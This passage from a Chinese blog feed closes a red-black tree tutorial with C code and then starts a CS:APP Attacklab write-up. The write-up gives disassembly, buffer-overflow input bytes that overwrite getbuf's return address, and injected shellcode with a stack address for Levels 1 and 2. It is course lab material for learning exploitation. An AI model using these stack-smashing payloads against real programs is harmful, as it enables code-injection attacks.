<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">trnode* <span class="title">deletetree</span><span class="params">(trnode* root,trnode *z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(z-&gt;left==<span class="literal">NULL</span>)</span><br><span class="line">        transplant(root, z, z-&gt;right);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(z-&gt;right==<span class="literal">NULL</span>)</span><br><span class="line">        transplant(root, z, z-&gt;left);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        trnode *y = findmin(z-&gt;right);</span><br><span class="line">        <span class="keyword">if</span>(y-&gt;parent!=z)</span><br><span class="line">        &#123;</span><br><span class="line">            transplant(root, y, y-&gt;right);</span><br><span class="line">            y-&gt;right = z-&gt;right;</span><br><span class="line">            y-&gt;right-&gt;parent = y;</span><br><span class="line">        &#125;</span><br><span class="line">        transplant(root, z, y);</span><br><span class="line">        y-&gt;left = z-&gt;left;</span><br><span class="line">        y-&gt;left-&gt;parent = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	插入和删除时间复杂度均为$O(h)$</p>
<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2>
<p>​	这部分主要讲了二叉搜索树的一些基本算法，但是由于二叉搜索树在面对一些极端情况的时候有可能会退化成链表，时间效率较低，所以我们接下来会介绍红黑树来进行优化。</p>
<h1>红黑树</h1>
<h2 id="定义-v2"><a class="header-anchor" href="#定义-v2">¶</a>定义</h2>
<p>​	红黑树是一种平衡的二叉搜索树，保证在最坏情况下进行基本动态集合操作的时间复杂度为$O(lgn)$</p>
<p>​	结点定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">int</span> color;<span class="comment">//存储颜色</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">node</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">node</span>* <span class="title">right</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">node</span> *<span class="title">p</span>;</span></span><br><span class="line">&#125;treenode;</span><br></pre></td></tr></table></figure>
<p>​	另外这里需要定义一个概念，即<strong>黑高</strong>，表示从某个结点x到达一个叶子结点任意一条简单路径上的黑色结点个数，我们用**bh(x)**来表示，定义红黑树的黑高为其根结点的黑高</p>
<p>​	另外就是感觉这里的叶子结点的定义似乎不太一样，是所有的空结点被定义成了叶子结点。然后就是这里把所有的空结点连接到了一个新的哨兵结点，大概类似于建立了一个虚点。</p>
<h2 id="性质"><a class="header-anchor" href="#性质">¶</a>性质</h2>
<ol>
<li>是一个二叉搜索树，但是在每个结点新增存储位表示结点的颜色，可以是RED或BLACK</li>
<li>每个结点的颜色都是红色或黑色</li>
<li>根结点是黑色的</li>
<li>所有叶子结点是黑色的</li>
<li>如果某个结点是红色的，那么它的子结点</li>
<li>对每个结点，从根节点到其所有后代的叶结点的简单路径上，均包含相同数目的黑色结点</li>
</ol>
<h2 id="旋转"><a class="header-anchor" href="#旋转">¶</a>旋转</h2>
<p>​	为了维护红黑树的性质，这里需要在每次插入和删除的时候通过旋转操作对红黑树进行维护，具体操作方法和AVL树几乎完全一样，这里给出左旋代码，右旋为左旋的镜像。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">treenode* <span class="title">left_rotate</span><span class="params">(treenode* root,treenode *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    treenode *y = x-&gt;right;</span><br><span class="line">    x-&gt;right = y-&gt;left;</span><br><span class="line">    <span class="keyword">if</span>(y-&gt;left!=<span class="literal">NULL</span>)</span><br><span class="line">        y-&gt;left-&gt;p = x;</span><br><span class="line">    y-&gt;p = x-&gt;p;</span><br><span class="line">    <span class="keyword">if</span>(x-&gt;p==<span class="literal">NULL</span>)</span><br><span class="line">        root = y;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(x==x-&gt;p-&gt;left)</span><br><span class="line">    &#123;</span><br><span class="line">        x-&gt;p-&gt;left = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        x-&gt;p-&gt;right = y;</span><br><span class="line">    &#125;</span><br><span class="line">    y-&gt;left = x;</span><br><span class="line">    x-&gt;p = y;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	时间复杂度：$O(1)$</p>
<h2 id="插入"><a class="header-anchor" href="#插入">¶</a>插入</h2>
<p>​	插入的话，我们是要将新的子结点置为红色进行插入，至于为什么要置为红色，因为这个时候，红黑树的五条特性，我们只违背了第四条，这个时候只需要根据第四条进行调整就可以将其维护成红黑树，但是一旦被置为黑色，第三、四、五条性质都有可能被违背，这个时候维护起来就非常的复杂了</p>
<p>​	现在先说一下插入结点的算法，其实整体插入和二叉搜索树是非常像的，主要就是需要在最后加入一个调整的算法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">treenode* <span class="title">insert</span><span class="params">(treenode* root,treenode *z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    treenode *y = <span class="literal">NULL</span>;</span><br><span class="line">    treenode *x = root;</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        y = x;</span><br><span class="line">        <span class="keyword">if</span>(x-&gt;key&lt;z-&gt;key)</span><br><span class="line">        &#123;</span><br><span class="line">            x = x-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            x = x-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    z-&gt;p = y;</span><br><span class="line">    <span class="keyword">if</span>(y==<span class="literal">NULL</span>)</span><br><span class="line">        root = z;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(z-&gt;key&lt;y-&gt;key)</span><br><span class="line">    &#123;</span><br><span class="line">        y-&gt;left = z;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        y-&gt;right = z;</span><br><span class="line">    z-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">    z-&gt;right = <span class="literal">NULL</span>;<span class="comment">//注意按照算法导论中的说法，其实这里应该是要指向建立好的nil虚点，不过个人感觉指向空问题不大</span></span><br><span class="line">    z-&gt;color = RED;</span><br><span class="line">    root=insert_fixup(root, z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	接下来就是红黑树算法的重点，也就是如何将一个不是红黑树的二叉树修正到红黑树，《算法导论》上将其分为三种情况并给出了相应证明，这里给出三种情况，由于对称性，只考虑当前结点为左孩子的情况。</p>
<ol>
<li>
<p>当叔结点为红色时，不满足性质四，只需要更改颜色即可，如下图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164729435.png" alt="image-20220326164729435"></p>
</li>
<li>
<p>否则，如果当前插入结点是右孩子，需要进行一次左旋，转换到情况三，如下图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164810908.png" alt="image-20220326164810908"></p>
</li>
<li>
<p>然后情况三就是当前插入结点是左孩子，那么更改父亲和爷爷的颜色之后右旋以下即可，如下图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164838646.png" alt="image-20220326164838646"></p>
<p><em><strong>以上图片均来源于博客<a href="https://blog.csdn.net/xiaofeng10330111/article/details/106080394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163393090616780262522686%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163393090616780262522686&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-106080394.first_rank_v2_pc_rank_v29&amp;utm_term=%E7%BA%A2%E9%BB%91%E6%A0%91&amp;spm=1018.2226.3001.4187">对红黑树的认识总结</a>  侵删</strong></em></p>
</li>
</ol>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">treenode* <span class="title">insert_fixup</span><span class="params">(treenode *root,treenode* z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(z-&gt;p-&gt;color==RED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(z-&gt;p==z-&gt;p-&gt;p-&gt;left)</span><br><span class="line">        &#123;</span><br><span class="line">            treenode *y = z-&gt;p-&gt;p-&gt;right;</span><br><span class="line">            <span class="keyword">if</span>(y-&gt;color==RED)<span class="comment">//第一种情况，叔叔的颜色为红，这个时候不满足性质四，更改颜色即可</span></span><br><span class="line">            &#123;</span><br><span class="line">                z-&gt;p-&gt;color = BLACK;</span><br><span class="line">                z-&gt;p-&gt;p-&gt;color = RED;</span><br><span class="line">                y-&gt;color = BLACK;</span><br><span class="line">                z = z-&gt;p-&gt;p;<span class="comment">//然后让z指针指向爷爷结点</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(z==z-&gt;p-&gt;right)<span class="comment">//否则的话来到第二种情况，即叔结点为黑色并且它为右孩子，这个时候可以旋转后转化为</span></span><br><span class="line">            &#123;                     <span class="comment">//情况三</span></span><br><span class="line">                z = z-&gt;p;</span><br><span class="line">                root = left_rotate(root, z);</span><br><span class="line">            &#125;</span><br><span class="line">            z-&gt;p-&gt;color = BLACK;<span class="comment">//情况三</span></span><br><span class="line">            z-&gt;p-&gt;p-&gt;color = RED;<span class="comment">//情况三，这里由于要作旋转，所以改颜色</span></span><br><span class="line">            root=right_rotate(root, z-&gt;p-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//镜像对称的一种情况，此处不再赘述</span></span><br><span class="line">        &#123;</span><br><span class="line">            treenode *y = z-&gt;p-&gt;p-&gt;left;</span><br><span class="line">            <span class="keyword">if</span>(y-&gt;color==RED)</span><br><span class="line">            &#123;</span><br><span class="line">                z-&gt;p-&gt;p-&gt;color = RED;</span><br><span class="line">                z-&gt;p-&gt;color = BLACK;</span><br><span class="line">                y-&gt;color = BLACK;</span><br><span class="line">                z = z-&gt;p-&gt;p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(z==z-&gt;p-&gt;left)</span><br><span class="line">            &#123;</span><br><span class="line">                z = z-&gt;p;</span><br><span class="line">                root = right_rotate(root, z);</span><br><span class="line">            &#125;</span><br><span class="line">            z-&gt;p-&gt;color = BLACK;</span><br><span class="line">            z-&gt;p-&gt;p-&gt;color = RED;</span><br><span class="line">            root = left_rotate(root, z-&gt;p-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="删除"><a class="header-anchor" href="#删除">¶</a>删除</h2>
<p>​	首先红黑树的删除也是基于二叉搜索树的删除过程来的，先给出和删除差不多的主要代码。</p>
<p>​	首先有一个移植操作，代码主要思路和上面一模一样。<s>现在我的Typora已经要卡成狗屎了，剩下部分主要贴图和文字说明吧</s></p>
<p>​	对于删除操作，我们需要有一个临时变量来记录删除前$y$的颜色，如果是黑色的话就需要进行调整，因为这样的话有可能一次违背性质1、2、4，看起来违背性质1似乎有点奇怪，这是因为如果是黑色，会导致$y$的所有祖先的黑高发生变化，这个时候视为将$y$的黑色过渡给了它的子结点，那么子结点就变成了个奇怪的颜色，<s>虽然这样搞怪怪的</s></p>
<p>​	下面我们需要修正这几条违背的性质，这里直接贴图吧，《算法导论》上给了严格的证明，<s>但是Typora真的要撑不住了</s></p>
<p>​	先来给出初步调整，主要用来维护性质一</p>
<ol>
<li>如果要删除的结点为a，他只有一个子结点b</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164901637.png" alt="image-20220326164901637"></p>
<ol start="2">
<li>
<p>如果要删除的结点a有两个子结点并且它的后继就是右结点</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164933507.png" alt="image-20220326164933507"></p>
<p>如果c为黑色，需要给d加一个颜色以维护性质五，这个时候需要关注d，因为可能不满足性质一</p>
</li>
<li>
<p>如果要删除的结点a有两个子结点并且后继不是右结点</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164956837.png" alt="image-20220326164956837"></p>
<p>这个时候关注的变成了c</p>
</li>
</ol>
<p>​    接下来要进行二次调整，维护剩下的错误</p>
<ol>
<li>
<p>如果关注结点的兄弟结点为红色</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326165026222.png" alt="image-20220326165026222"></p>
<p>先左旋，再改色，此时关注结点不变。</p>
</li>
<li>
<p>如果关注结点是a，它的兄弟和兄弟的左右结点都是黑色的</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326165123519.png" alt="image-20220326165123519"></p>
</li>
<li>
<p>如果关注节点是 a，它的兄弟节点 c 是黑色，c 的左子节点 d 是红色，c 的右子节点 e 是黑色</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326165148613.png" alt="image-20220326165148613"></p>
</li>
<li>
<p>如果关注节点 a 的兄弟节点 c 是黑色的，并且 c 的右子节点是红色的</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326165213436.png" alt="image-20220326165213436"></p>
</li>
</ol>
<h2 id="总结-v2"><a class="header-anchor" href="#总结-v2">¶</a>总结</h2>
<p>​	红黑树总的来说算是一个基本的平衡树，效率较好，但是个人感觉没有AVL的操作容易实现和理解，另外就是由于篇幅原因，最终删除部分写的很草率，而删除部分恰好是最难的…但是这个图画的还是非常好的，<s>虽然不是我画的</s>，图片摘自<a href="https://blog.csdn.net/xiaofeng10330111/article/details/106080394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163393090616780262522686%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163393090616780262522686&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-106080394.first_rank_v2_pc_rank_v29&amp;utm_term=%E7%BA%A2%E9%BB%91%E6%A0%91&amp;spm=1018.2226.3001.4187">对红黑树的认识总结</a></p>
<p>​	代码我应该会单独写一篇文章发出去，另外插入和删除部分可以参看**《算法导论》**，里面的证明是非常详细的</p>
]]></content>
      <categories>
        <category>数据结构</category>
        <category>二叉树</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>Attacklab</title>
    <url>/2022/03/27/Attacklab/</url>
    <content><![CDATA[<h1>工具与材料</h1>
<p>​	主要用的工具和Bomblab一样，tmux+gdb+vim的组合。</p>
<p>​	Attacklab主要和csapp的3.10.3和3.10.4联系密切，另外其实也需要参考官方的文档，即<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">官方文档</a>，这里面给出了整个lab中文件的介绍以及一些提示。</p>
<h1>Part 1</h1>
<p>​	这一部分由三个小部分组成，主要涉及到了代码注入攻击。</p>
<p>​	另外，根据官方文档，接下来的三个小部分都和两个函数有关，代码直接贴在下面：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">	<span class="built_in">Gets</span>(buf); <span class="comment">//和C标准库中的gets函数一样，就是那个很危险的函数。</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	val = <span class="built_in">getbuf</span>();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	相应的，我们可以看看这两个函数的反汇编，为后面做一些准备。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:       48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  4017ac:       48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:       e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:       b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4017b9:       48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  4017bd:       c3                      retq</span><br><span class="line">  4017be:       90                      nop</span><br><span class="line">  4017bf:       90                      nop</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:       48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  40196c:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401971:       e8 32 fe ff ff          callq  4017a8 &lt;getbuf&gt;</span><br><span class="line">  401976:       89 c2                   mov    %eax,%edx</span><br><span class="line">  401978:       be 88 31 40 00          mov    $0x403188,%esi</span><br><span class="line">  40197d:       bf 01 00 00 00          mov    $0x1,%edi</span><br><span class="line">  401982:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401987:       e8 64 f4 ff ff          callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:       48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401990:       c3                      retq</span><br><span class="line">  401991:       90                      nop</span><br><span class="line">  401992:       90                      nop</span><br><span class="line">  401993:       90                      nop</span><br><span class="line">  401994:       90                      nop</span><br><span class="line">  401995:       90                      nop</span><br><span class="line">  401996:       90                      nop</span><br><span class="line">  401997:       90                      nop</span><br><span class="line">  401998:       90                      nop</span><br><span class="line">  401999:       90                      nop</span><br><span class="line">  40199a:       90                      nop</span><br><span class="line">  40199b:       90                      nop</span><br><span class="line">  40199c:       90                      nop</span><br><span class="line">  40199d:       90                      nop</span><br><span class="line">  40199e:       90                      nop</span><br><span class="line">  40199f:       90                      nop</span><br></pre></td></tr></table></figure>
<p>​	从<code>getbuf</code>函数的反汇编中我们可以看出它开辟了40个字节的栈空间。</p>
<p>​	所以在这一部分我们要做的就是利用那个不安全的<code>gets</code>函数来做一些攻击。</p>
<h2 id="Level-1"><a class="header-anchor" href="#Level-1">¶</a>Level 1</h2>
<p>​	这个部分不需要我们进行代码注入攻击，我们只需要通过更改<code>getbuf</code>函数返回的地址来执行<code>touch1</code>函数即可，那我们先看一下这个函数的反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:       48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  4017c4:       c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:       00 00 00</span><br><span class="line">  4017ce:       bf c5 30 40 00          mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:       e8 e8 f4 ff ff          callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:       bf 01 00 00 00          mov    $0x1,%edi</span><br><span class="line">  4017dd:       e8 ab 04 00 00          callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:       bf 00 00 00 00          mov    $0x0,%edi</span><br><span class="line">  4017e7:       e8 54 f6 ff ff          callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>​	首先，在刚刚我们已经发现<code>getbuf</code>函数开辟了40个字节的栈空间，根据书中3.8节的知识，在调用函数时会先将原函数的返回位置压入栈，然后新函数开辟栈帧，那么我们要做的其实就是通过缓冲区把那个返回位置覆盖掉，改写成<code>touch1()</code>函数的地址就行，因此只需要输入下面的内容即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 </span><br></pre></td></tr></table></figure>
<p>​	注意，在栈上填写地址的时候要注意是小端法存储，所以需要倒这来。</p>
<p>​	我们利用文档里的输入方法，看一下是否正确，输出如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$&gt;./hex2raw &lt; phase1.txt | ./ctarget -q</span><br><span class="line"><span class="attr">Cookie</span>: <span class="number">0x59b997fa</span></span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level <span class="number">1</span> <span class="keyword">with</span> target ctarget</span><br><span class="line"><span class="attr">PASS</span>: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  <span class="number">15213</span>-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  <span class="number">1</span>:PASS:<span class="number">0xffffffff</span>:ctarget:<span class="number">1</span>:<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> C0 <span class="number">17</span> <span class="number">40</span></span><br></pre></td></tr></table></figure>
<p>​	这个过程中的栈帧变化如下图所示。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220327200713473.png" alt="image-20220327200713473"></p>
<p>​	这里我想额外记录一下Linux命令行中<code>| &amp;&amp; &amp; ||</code>的含义，这个在之前好像接触过，但是因为没怎么用过就给忘了。</p>
<ul>
<li><code>&amp;</code> 表示任务在后台执行，这个在使用geth的时候用过，经常和<code>nohup</code>命令一起使用</li>
<li><code>&amp;&amp;</code> 表示前一条命令执行成功时，才执行后一条命令 ，如 <code>echo '1‘ &amp;&amp; echo '2'</code></li>
<li><code>|</code> 表示管道，上一条命令的输出，作为下一条命令参数，如 <code>echo 'yes' | wc -l</code></li>
<li><code>||</code> 表示上一条命令执行失败后，才执行下一条命令，如 cat <code>nofile || echo &quot;fail&quot;</code></li>
</ul>
<h2 id="Level-2"><a class="header-anchor" href="#Level-2">¶</a>Level 2</h2>
<p>​	这里是要把一小部分代码注入到源程序中。</p>
<p>​	最开始的要求和Level 1是一样的，不过这次是跳转到<code>touch2</code>函数，C语言定义如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	根据函数定义，可以知道这里我们需要把文件夹下的<code>cookies.txt</code>中的内容作为函数参数，所以相比于上一个问题，这里多了一个传参的过程，所以不能简单地修改返回地址，这样就无法传递参数了。</p>
<p>​	记得之前提到过，函数的第一个参数是通过寄存器<code>%rdi</code>传递的，所以我们需要想办法修改这个寄存器的值，另外题目中也提示到了我们需要注入一段代码，那这段代码大概需要实现下面的功能：</p>
<ul>
<li>设置寄存器<code>%rdi</code>的值</li>
<li>返回到<code>touch2</code>函数的入口</li>
</ul>
<p>​    那么，我们大概需要使用这样三条汇编指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi # 赋值</span><br><span class="line">pushq $0x4017ec # 0x4017ec是touch2的开始地址</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>​	可以将其编译成机器码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; gcc -c test.s</span><br><span class="line">$&gt; objdump -d test.o</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>​	然后我们需要考虑一下如何去执行这段代码。事实上，根据之前写<code>touch1()</code>的经验，我们只需要通过缓冲区溢出来更改程序的返回地址，让它返回到想要的位置即可。这个具体希望的位置很多，为了简单起见，我们就把我们实现的指令放到栈底吧，那我们可以用gdb查看一下<code>getbufer</code>函数对应的栈底位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) b *0x4017ac</span><br><span class="line">(gdb) r -q </span><br><span class="line">(gdb) info r rsp</span><br><span class="line">rsp            0x5561dc78       0x5561dc78</span><br></pre></td></tr></table></figure>
<p>​	因此，我们只需要输入如下字节即可</p>
<figure class="highlight d"><table><tr><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">0</span>0 c3 <span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0</span><br><span class="line"><span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0</span><br><span class="line"><span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0 <span class="number">0</span>0</span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span></span><br></pre></td></tr></table></figure>
<p>​	输出如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; ./hex2raw &lt; phase2.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>​	这个过程中栈的变化大概如下图</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220327200735449.png" alt="image-20220327200735449"></p>
<h2 id="Level-3"><a class="header-anchor" href="#Level-3">¶</a>Level 3</h2>
<p>​	这一部分和Level 2其实差不多，但是区别在于这一部分要传递的参数是个字符串，以及这一部分要执行的函数<code>touch3</code>还会调用一个<code>hexmatch</code>函数，这又会导致一些别的变化，先看一下这两个函数的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int hexmatch(unsigned val, char *sval)&#123;</span><br><span class="line">    char cbuf[110];</span><br><span class="line">    char *s = cbuf + random() % 100;</span><br><span class="line">    sprintf(s, &quot;%.8x&quot;, val);</span><br><span class="line">    return strncmp(sval, s, 9) == 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void touch3(char *sval)&#123;</span><br><span class="line">    vlevel = 3;</span><br><span class="line">    if (hexmatch(cookie, sval))&#123;</span><br><span class="line">        printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);</span><br><span class="line">        validate(3);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);</span><br><span class="line">        fail(3);</span><br><span class="line">    &#125;</span><br><span class="line">    